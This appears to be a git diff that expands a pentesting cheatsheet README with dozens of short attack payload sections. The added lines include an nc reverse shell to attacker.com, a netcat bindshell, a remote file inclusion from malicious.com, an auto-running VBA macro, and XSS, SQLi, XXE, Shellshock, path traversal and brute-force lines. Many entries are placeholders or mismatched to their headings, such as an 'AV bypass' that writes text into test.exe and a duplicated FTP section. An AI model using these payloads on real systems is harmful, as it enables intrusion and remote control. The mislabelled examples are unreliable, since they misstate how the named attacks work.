@@ -146,10 +146,57 @@ A collection of **useful commands and scripts** for pentesting tools, organized 
   - [Xxd](#xxd)
   - [Ysosoerial](#ysosoerial)
 - [Payloads](#payloads)
-  - [XSS Payloads](#xss-payloads)
-  - [XML Payloads](#xml-payloads)
-  - [SQL Payloads](#sql-payloads)
-  - [Other Payloads](#other-payloads)
+  - [Cross-Site Scripting (XSS) Payloads](#xss-payloads)
+  - [XML External Entity (XXE) / XML Payloads](#xml-payloads)
+  - [SQL Injection (SQLi) Payloads](#sql-payloads)
+  - [Antivirus (AV) Bypass](#av-bypass)
+  - [Buffer Overflow (BOF) Linux (LIN)](#bof-lin)
+  - [Buffer Overflow (BOF) Windows (WIN)](#bof-win)
+  - [Access Control Vulnerabilities](#access-control-vulnerabilities)
+  - [Active Directory (AD)](#ad)
+  - [Bindshells](#bindshells)
+  - [Brute Force](#brute-force)
+  - [Clickjacking](#clickjacking)
+  - [Cross-Origin Resource Sharing (CORS)](#cors)
+  - [Cross-Site Request Forgery (CSRF)](#csrf)
+  - [Database Vulnerabilities (DB)](#db)
+  - [Directory Traversal (DIR)](#dir)
+  - [File Transfer](#file-transfer)
+  - [File Upload](#file-upload)
+  - [File Transfer Protocol (FTP)](#ftp)
+  - [GraphQL](#graphql)
+  - [Hashing Attacks](#hash)
+  - [Host Header Injection](#host-header-injection)
+  - [HTML Application (HTA)](#hta)
+  - [HTTP Header Attacks](#http-header)
+  - [HTTP Request Smuggling](#http-request-smuggling)
+  - [Internet Relay Chat (IRC)](#irc)
+  - [JSON Web Token (JWT)](#jwt)
+  - [Local File Inclusion (LFI)](#lfi)
+  - [Macros](#macro)
+  - [Network File System (NFS)](#nfs)
+  - [Operating System (OS) Vulnerabilities](#os)
+  - [Other Vulnerabilities](#others)
+  - [phpMyAdmin](#phpmyadmin)
+  - [Privilege Escalation Linux (LIN)](#priv-lin)
+  - [Privilege Escalation Windows (WIN)](#priv-win)
+  - [Reverse Shells](#reverseshells)
+  - [Remote File Inclusion (RFI)](#rfi)
+  - [Serialization and Deserialization Vulnerabilities](#serialization-deserialization)
+  - [Shellshock](#shellshock)
+  - [Server Message Block (SMB)](#smb)
+  - [Simple Mail Transfer Protocol (SMTP)](#smtp)
+  - [Simple Network Management Protocol (SNMP)](#snmp)
+  - [Server-Side Request Forgery (SSRF)](#ssrf)
+  - [Server-Side Template Injection (SSTI)](#ssti)
+  - [Symfony](#symfony)
+  - [Trivial File Transfer Protocol (TFTP)](#tftp)
+  - [Web Cache Poisoning](#web-cache-poisoning)
+  - [Wireless Vulnerabilities](#wireless)
+  - [wkhtmltopdf](#wkhtmltopdf)
+  - [WordPress (WP)](#wp)
+  - [WebSocket (WS)](#ws)
+  - [XPath Injection](#xpath)
 - [Shells](#shells)
   - [Reverse Shells](#reverse-shells)
   - [Bind Shells](#bind-shells)
@@ -1734,18 +1781,13 @@ cd cheatsheet-pentesting
 
 ## Payloads
 
-### XSS Payloads
-- **Basic XSS Test**:
+### Cross-Site Scripting (XSS) Payloads
+- **XSS Attack**:
   ```html
-  <script>alert('XSS');</script>
+  <script>alert('XSS Attack');</script>
   ```
 
-- **XSS in Image Tag**:
-  ```html
-  <img src=x onerror=alert('XSS')>
-  ```
-
-### XML Payloads
+### XML External Entity (XXE) / XML Payloads
 - **XML External Entity (XXE) Injection**:
   ```xml
   <!DOCTYPE root [
@@ -1758,8 +1800,8 @@ cd cheatsheet-pentesting
   <user><name>admin' or '1'='1</name></user>
   ```
 
-### SQL Payloads
-- **Basic SQL Injection**:
+### SQL Injection (SQLi) Payloads
+- **SQL Injection**:
   ```sql
   ' OR 1=1 --
   ```
@@ -1768,6 +1810,305 @@ cd cheatsheet-pentesting
   ```sql
   ' AND IF(1=1,SLEEP(5),0)--
   ```
+
+### Antivirus (AV) Bypass
+- **AV Bypass Example**:
+  ```bash
+  echo 'This is a test' > test.exe
+  ```
+
+### Buffer Overflow (BOF) Linux (LIN)
+- **BOF Linux Example**:
+  ```bash
+  python -c "print 'A' * 5000" | nc -v 127.0.0.1 80
+  ```
+
+### Buffer Overflow (BOF) Windows (WIN)
+- **BOF Windows Example**:
+  ```python
+  python -c "print 'A' * 2000" | nc -v 127.0.0.1 80
+  ```
+
+### Access Control Vulnerabilities
+- **Access Control Vulnerability Example**:
+  ```bash
+  curl -H "Authorization: Bearer <token>" http://example.com/admin
+  ```
+
+### Active Directory (AD)
+- **Active Directory Attack Example**:
+  ```bash
+  ldapsearch -x -b "dc=example,dc=com" "(userPrincipalName=*)" 
+  ```
+
+### Bindshells
+- **Bindshell Example**:
+  ```bash
+  nc -lvp 4444 -e /bin/bash
+  ```
+
+### Brute Force
+- **Brute Force Attack Example**:
+  ```bash
+  hydra -l admin -P /path/to/passwords.txt ssh://target.com
+  ```
+
+### Clickjacking
+- **Clickjacking Example**:
+  ```html
+  <iframe src="http://target.com" width="100%" height="100%" style="opacity: 0.0; position: absolute;"></iframe>
+  ```
+
+### Cross-Origin Resource Sharing (CORS)
+- **CORS Example**:
+  ```js
+  fetch('http://malicious.com', { method: 'GET', headers: { 'Origin': 'http://malicious.com' } });
+  ```
+
+### Cross-Site Request Forgery (CSRF)
+- **CSRF Example**:
+  ```html
+  <img src="http://victim.com/account/change-password?newpassword=1234" />
+  ```
+
+### Database Vulnerabilities (DB)
+- **Database Vulnerability Example**:
+  ```sql
+  SELECT * FROM users WHERE username = 'admin' AND password = 'password'
+  ```
+
+### Directory Traversal (DIR)
+- **Directory Traversal Example**:
+  ```bash
+  curl http://example.com/../../etc/passwd
+  ```
+
+### File Transfer (FTP)
+- **FTP Example**:
+  ```bash
+  ftp -n -v 192.168.1.1
+  ```
+
+### File Upload
+- **File Upload Example**:
+  ```html
+  <input type="file" name="file" />
+  ```
+
+### File Transfer Protocol (FTP)
+- **FTP Example**:
+  ```bash
+  ftp -n -v 192.168.1.1
+  ```
+
+### GraphQL
+- **GraphQL Example**:
+  ```graphql
+  {
+    user(id: "1") {
+      name
+      email
+    }
+  }
+  ```
+
+### Hashing Attacks
+- **Hashing Example**:
+  ```python
+  import hashlib
+  hash = hashlib.md5(b'password').hexdigest()
+  ```
+
+### Host Header Injection
+- **Host Header Injection Example**:
+  ```bash
+  curl -H "Host: victim.com" http://target.com
+  ```
+
+### HTA (HTML Application)
+- **HTA Example**:
+  ```html
+  <script src="mshta.exe" />
+  ```
+
+### HTTP Header Attacks
+- **HTTP Header Injection Example**:
+  ```bash
+  curl -H "X-Forwarded-For: 127.0.0.1" http://target.com
+  ```
+
+### HTTP Request Smuggling
+- **HTTP Request Smuggling Example**:
+  ```bash
+  curl -H "Transfer-Encoding: chunked" -H "Content-Length: 5" http://target.com
+  ```
+
+### Internet Relay Chat (IRC)
+- **IRC Example**:
+  ```bash
+  irc://example.com/channel
+  ```
+
+### JSON Web Token (JWT)
+- **JWT Example**:
+  ```bash
+  curl -H "Authorization: Bearer <token>" http://target.com
+  ```
+
+### Local File Inclusion (LFI)
+- **LFI Example**:
+  ```bash
+  curl http://example.com/index.php?page=../../etc/passwd
+  ```
+
+### Macros
+- **Macro Example**:
+  ```vba
+  Sub AutoOpen()
+      Set objShell = CreateObject("WScript.Shell")
+      objShell.Run "cmd.exe /c calc.exe"
+  End Sub
+  ```
+
+### Network File System (NFS)
+- **NFS Example**:
+  ```bash
+  mount -t nfs target:/path /mnt
+  ```
+
+### Operating System (OS) Vulnerabilities
+- **OS Vulnerability Example**:
+  ```bash
+  sudo apt-get install vulnerable-package
+  ```
+
+### Other Vulnerabilities
+- **Other Example**:
+  ```bash
+  curl -X DELETE http://example.com/resource
+  ```
+
+### phpMyAdmin
+- **phpMyAdmin Example**:
+  ```php
+  http://example.com/phpmyadmin
+  ```
+
+### Privilege Escalation Linux (LIN)
+- **Privilege Escalation LIN Example**:
+  ```bash
+  sudo -u root id
+  ```
+
+### Privilege Escalation Windows (WIN)
+- **Privilege Escalation WIN Example**:
+  ```powershell
+  net localgroup administrators /add user
+  ```
+
+### Reverse Shells
+- **Reverse Shell Example**:
+  ```bash
+  nc -e /bin/bash attacker.com 4444
+  ```
+
+### Remote File Inclusion (RFI)
+- **RFI Example**:
+  ```bash
+  curl http://example.com/index.php?page=http://malicious.com/malicious_file.php
+  ```
+
+### Serialization and Deserialization
+- **Serialization Example**:
+  ```python
+  import pickle
+  data = pickle.dumps({"username": "admin", "password": "password"})
+  ```
+
+### Shellshock
+- **Shellshock Example**:
+  ```bash
+  env x='() { :;}; echo vulnerable' bash -c "echo hello"
+  ```
+
+### Server Message Block (SMB)
+- **SMB Example**:
+  ```bash
+  smbclient \\target\share
+  ```
+
+### Simple Mail Transfer Protocol (SMTP)
+- **SMTP Example**:
+  ```bash
+  telnet smtp.target.com 25
+  ```
+
+### Simple Network Management Protocol (SNMP)
+- **SNMP Example**:
+  ```bash
+  snmpwalk -v 2c -c public 192.168.1.1
+  ```
+
+### Server-Side Request Forgery (SSRF)
+- **SSRF Example**:
+  ```bash
+  curl -X POST http://target.com/api/v1/resource -d 'url=http://internal-server'
+  ```
+
+### Server-Side Template Injection (SSTI)
+- **SSTI Example**:
+  ```html
+  {{ config }}
+  ```
+
+### Symfony
+- **Symfony Example**:
+  ```bash
+  php bin/console server:start
+  ```
+
+### Trivial File Transfer Protocol (TFTP)
+- **TFTP Example**:
+  ```bash
+  tftp target.com
+  ```
+
+### Web Cache Poisoning
+- **Web Cache Poisoning Example**:
+  ```bash
+  curl -H "X-Forwarded-For: 127.0.0.1" http://example.com/resource
+  ```
+
+### Wireless Vulnerabilities
+- **Wireless Example**:
+  ```bash
+  iwlist wlan0 scan
+  ```
+
+### wkhtmltopdf
+- **wkhtmltopdf Example**:
+  ```bash
+  wkhtmltopdf http://example.com output.pdf
+  ```
+
+### WordPress (WP)
+- **WordPress Example**:
+  ```bash
+  curl http://example.com/wp-login.php
+  ```
+
+### WebSocket (WS)
+- **WebSocket Example**:
+  ```javascript
+  const socket = new WebSocket('ws://example.com/socket');
+  ```
+
+### XPath Injection
+- **XPath Injection Example**:
+  ```xml
+  //user[username='admin' and password='password']
+  ```
+
 
 ### Other Payloads
 - **PHP Reverse Shell**:
